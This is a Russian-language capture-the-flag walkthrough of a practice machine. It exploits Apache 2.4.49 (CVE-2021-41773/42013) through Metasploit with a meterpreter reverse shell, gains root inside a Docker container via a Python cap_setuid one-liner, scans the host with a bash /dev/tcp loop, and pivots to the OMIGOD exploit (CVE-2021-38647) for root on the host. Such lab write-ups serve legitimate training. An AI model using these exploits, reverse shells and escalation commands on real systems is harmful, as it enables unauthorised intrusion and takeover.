### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО
- умение эксплуатировать уязвимости старых версий апаче, omi
- умение работать с metasploit
- понимание капабилитис и в каких случаях их можно проэксплуатировать
- знание структуры докер-контейнера и того, как из него можно выбраться
- базовое знание бэша
### ВЗЯТИЕ ШЕЛЛА
по классике, в первую очередь сканируем порты. на удивление, скан довольно щедрый
```
rustscan --ulimit 5000 --range 0-65535 -a 10.113.166.51 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
Open 10.113.166.51:22
Open 10.113.166.51:80
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: ...
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.49 ((Unix))
|_http-favicon: Unknown favicon MD5: 02FD5D10B62C7BC5AD03F8B0F105323C // скрипт http-favicon скачивает иконку с сервера и вычисляет ее хэш-сумму в формате MD5. Nmap сравнивает этот хэш со своей встроенной бд. в базе хранятся MD5-хэши стандартных иконок известных систем: WordPress, Joomla, phpMyAdmin, роутеров Cisco, серверов Tomcat и т.д., обычно хеш используется для осинта и для поиска сайтов с тем же шаблоном (через shodan, например), для определения cms. то что нмап ничего не нашел говорит о том, что это не стандартная cms
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE  // TRACE!!! потенциальная xst (хотя в современных браузераз редко возможна, плюс вряд ли встретится в этой машине), но этот метод может выдать внутренние подзаголовки, который добавляет внутренний балансировщик
|_  Potentially risky methods: TRACE
|_http-title: Consult - Business Consultancy Agency Template | Home
|_http-server-header: Apache/2.4.49 (Unix) // SOS!!! у этой версии апаче критическая уязвимость Path Traversal / RCE (CVE-2021-41773)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

попробуем воспользоваться уязвимостью апаче (для удобства воспольуюсь msfconsole). ищем нужный пэйлоад и настраиваем его
```
msf > search apache 2.4.49

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
   1    \_ target: Automatic (Dropper)              .                .          .      .
   2    \_ target: Unix Command (In-Memory)         .                .          .      .
   ...
msf > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
... // (устанавливаем нужное через set)
msf exploit(multi/http/apache_normalize_path_rce) > options
Module options (exploit/multi/http/apache_normalize_path_rce):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   CVE        CVE-2021-42013        yes       The vulnerability to use (Accepted: CVE-2021-41773, CVE-2
                                              021-42013)
   DEPTH      5                     yes       Depth for Path Traversal
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][.
                                              ..]. Supported proxies: socks5, socks5h, sapni, http, soc
                                              ks4
   RHOSTS     ip                    yes       The target host(s), see https://docs.metasploit.com/docs/
                                              using-metasploit/basics/using-metasploit.html
   RPORT      80                    yes       The target port (TCP)
   SSL        false                 no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin              yes       Base path
   VHOST      ip                    no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  your_ip          yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```
и ловим реверсшелл за daemon

### ВЗЯТИЕ РУТА
по базе сначала апгрейдим шелл и оглядываемся вокруг (```python3 -c 'import pty; pty.spawn("/bin/bash")'```). по названию машины можно сразу предположить, что мы в контейнере 
```
daemon@4a70924bafa0:/bin$ df -h и видела:
overlay 19G 5.9G 12G 34% /   (это специфическая файловая система, которую Docker использует для объединения слоев образа. корень (/) на overlay - мы в контейнере)
```
попробуем установить линпис в папку /tmp (можно через питоновский сервер, можно через мсфконсоль). подгружается! (значит, на тачке не норм настроены привилегии(скорее всего нет аппармора), плюс стоит что-то вроде ```root filesystem mode rw```, а тк не ro, то можно не париться с выполнением кода через оперативную память). даем линпису права на исполнение и запускаем его. вывод скрипта подтверждает предположение. также из нтересного
```
╔══════════╣ Docker Container details (T1613)
═╣ Am I inside Docker group ....... No                                                                   
═╣ Looking and enumerating runtime sockets:
═╣ Docker version ................. Not Found                                                            
═╣ Vulnerable to CVE-2019-5736 .... Not Found                                                            
═╣ Vulnerable to CVE-2019-13139 ... Not Found                                                            
═╣ Vulnerable to CVE-2021-41091 ... Not Found                                                            
═╣ Rootless Docker? ............... No // докер демон с правами рута!!!!                                                                  

╔══════════╣ Container & breakout enumeration (T1611)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/container-security/index.html     
═╣ Container ID ................... 4a70924bafa0═╣ Container Full ID .............. 4a70924bafa01a7b3f78dd2d91f4cfcadaec99422c17a1de88900fb3d39b3906
══╣ Hardening & isolation (T1611)
═╣ Seccomp mode ................... filtering (2)                                                        
═╣ NoNewPrivs ..................... disabled (0)
═╣ AppArmor profile ............... docker-default (enforce)
═╣ SELinux status ................. disabled
═╣ User namespace mappings ....... initial user namespace // рут в контейнере = рут на хосте
```
эта связка нам дает возможность выйти из контейнера с правами рута (плюс, в теории, мы сможем эксплуатировать ядро)
```
Режим Docker	               User Namespace	               Результат после побега (Breakout)
Rootless no                      Initial                     ROOT (Полный захват сервера)
Rootless no                      Mapped               	    Обычный юзер (UID 100000, нужно снова повышать права)
Rootless	yes                     Всегда Mapped	             Обычный юзер (Тот, кто запустил докер)
```
также из интересного - линпис подсветил быстренький способ повыситься до рута
```
Files with capabilities (limited to 50):
/usr/bin/python3.7 = cap_setuid+ep
```
видим, что у питона в капабилитис стоит право менять uid. ну, раз для нас расщедрились - воспользуемся

```
/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
и вот, мы теперь полноправный рут! (забавно, что вся система нас видит как суперюзера, хотя и запертого в контейнере)

### ВЫХОД ИЗ КОНТЕЙНЕРА

в ```/proc/mounts``` у нас нет проброшенных с хоста папок(типа /dev/sdb1), через lsblk (удивительно, что работает) мы можем увидеть структуру сервера, через ```capsh --print``` - что у нас нет cap_sys_admin и монтировать директории мы не можем, docker.sock у нас не проброшен - стандартные варианты не работа.ь. значит, попробуем просканировать хост на наличие видимых из контейнера портов 
```
root@4a70924bafa0:/etc/skel# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
```
видим, что адрес хоста 172.17.0.1. для начала попробуем просканировать его (вообще, по добру надо было бы сканировать всю подсеть, но в таком задании вряд ли это потребуется). вообще, можно, наверное, перекинуть бинарник нмапа, но решила написать скрипт на баше (сделала его скользящим, чтобы не повесить контейнер и не попасть под горячую руку oom killer'а, плюс чтобы не зависать на отфильтрованных фаерволлом портах). 
```bash -c 'MAX_THREADS=50; for port in {1..10000}; do while [ $(jobs -rp | wc -l) -ge $MAX_THREADS ]; do sleep 0.1; done; ( (echo < /dev/tcp/172.17.0.1/$port) &>/dev/null && echo "Порт $port ОТКРЫТ" ) & done; wait'```
видим вывод
```
Порт 22 ОТКРЫТ
Порт 80 ОТКРЫТ
Порт 5986 ОТКРЫТ
```
бинго! на 5986 порту обычно висит служба OMI (Open Management Infrastructure) — проект от Microsoft, грубо говоря, это инструмент, который позволяет администраторам удаленно управлять линукс-серверами (вообще, не факт, что версия уязвима, но как вектор атаки - вполне возможно сработает)

суть: можно обратиться по данному порту и попросить сервер выполнить определенную команду, при этом служба проверяет заголовок Authorization в запросе. если там правильный логин и пароль — выполняет. 

уязвимость omigod: если отправить запрос на выполнение команды и вообще удалить заголовок Authorization из запроса, то кривой код на языке C (на котором написан OMI) сходит с ума
из-за ошибки программистов, если заголовка нет вообще, переменная проверки аутентификации просто остается пустой (или равной нулю). а в Linux UID=0 — это root, и оми выполняет все с правами рута

эксплойт решила запустить через msfconsole
```

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   ...
   3  exploit/linux/misc/cve_2021_38647_omigod   2021-09-14       excellent  Yes    Microsoft OMI Management Interface Authentication Bypass
   4    \_ target: Unix Command                  .                .          .      .
   5    \_ target: Linux Dropper                 .                .          .      .

msf exploit > use 3
msf exploit(linux/misc/cve_2021_38647_omigod) > route add 172.17.0.0 255.255.255.0 1 // пивотинг(использование взломанной машины, чтобы дотянуться до других,
видных ей). команда говорит типа: «если я захочу отправить пакеты в сеть 172.17.0.x, пропихни их через сессию 1»
...
Module options (exploit/linux/misc/cve_2021_38647_omigod):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...].
                                         Supported proxies: socks5, socks5h, sapni, http, socks4
   RHOSTS     172.17.0.1       yes       The target host(s), see https://docs.metasploit.com/docs/using
                                         -metasploit/basics/using-metasploit.html
   RPORT      5986             yes       The target port (TCP)
   SRVHOST                     no        The local host to listen on and use for incoming connections
   SRVSSL     true             no        Negotiate SSL/TLS for local server connections
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generate
                                         d)
   TARGETURI  /wsman           yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVPORT  8080             yes       The local port to listen on


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  your_ip          yes       The listen address (an interface may be specified)
   LPORT  5555             yes       The listen port


```
пишем ```run```, запускаем эксплойт и ловим рута на хосте!😎 

<img width="374" height="112" alt="image" src="https://github.com/user-attachments/assets/96626f29-d585-4ae3-809b-5a68d0274a2d" />

p.s. в итоге даже сайт не посмотрела ведь апхпхапх
